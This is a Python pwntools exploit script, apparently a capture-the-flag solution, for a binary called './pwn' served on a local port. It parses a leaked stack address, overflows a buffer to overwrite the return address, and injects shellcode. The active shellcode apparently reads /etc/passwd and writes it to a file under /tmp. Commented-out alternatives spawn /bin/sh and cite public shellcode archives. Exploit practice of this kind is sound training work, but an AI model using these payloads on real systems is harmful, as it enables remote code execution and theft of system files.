#!/usr/bin/env python3

from pwn import *
from pwn import p64

exe = ELF("./pwn",checksec=True)

context.binary = exe
context.log_level = 'debug'
context.terminal = ["xterm", "-e"]
# context.terminal = ["gnome-terminal", "--", "bash", "-c"]
context(os='linux', arch='amd64', log_level='debug')

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # gdbscript = "b *0x00000000004006b2"
        # gdb.attach(r,gdbscript=gdbscript)
    else:
        r = remote("127.0.0.1", 20005)

    return r

def main():
    r = conn()

    r.recvuntil(b': [')
    leaked_buffer_address = int(r.recv(14),16)
    
    print(leaked_buffer_address)
    
    # shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
    # Linux/x64 - execve(/bin/sh) Shellcode (23 bytes)
    # https://www.exploit-db.com/exploits/46907
    
    # shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
    # Linux/x64 - execve(/bin/sh) Shellcode (24 bytes)
    # https://www.exploit-db.com/exploits/42179
    
    # shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
    # Linux/x64 execve(/bin/sh) Shellcode
    # https://shell-storm.org/shellcode/files/shellcode-806.html
    
    # shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf"
    # shellcode += b"\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54"
    # shellcode += b"\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
    # /** x86_64 execveat("/bin//sh") 29 bytes shellcode
    # https://shell-storm.org/shellcode/files/shellcode-905.html

    # shellcode list of all arch
    # https://shell-storm.org/shellcode/index.html
    
    shellcode = b"\x48\x31\xc0\xb0\x02\x48\x31\xff\xbb\x73\x77\x64\x00\x53\x48\xbb\x2f\x65\x74\x63\x70\x61\x73\x53\x48\x8d\x3c\x24\x48\x31\xf6\x0f\x05\x48\x89\xc3\x48\x31\xc0\x48\x89\xdf\x48\x89\xe6\x66\xba\xff\xff\x0f\x05\x49\x89\xc0\x48\x89\xe0\x48\x31\xdb\x53\xbb\x66\x69\x6c\x65\x53\x48\xbb\x2f\x74\x6d\x70\x6f\x75\x74\x53\x48\x89\xc3\x48\x31\xc0\xb0\x02\x48\x8d\x3c\x24\x48\x31\xf6\x6a\x66\x66\x5e\x0f\x05\x48\x89\xc7\x48\x31\xc0\xb0\x01\x48\x8d\x33\x48\x31\xd2\x4c\x89\xc2\x0f\x05"
    
    payload = b"A"*16+ b"B"*8 
    payload += p64(leaked_buffer_address+len(payload)+8) + shellcode
    r.sendlineafter(b'answer : \n',payload)
    r.interactive()

if __name__ == "__main__":
    main()
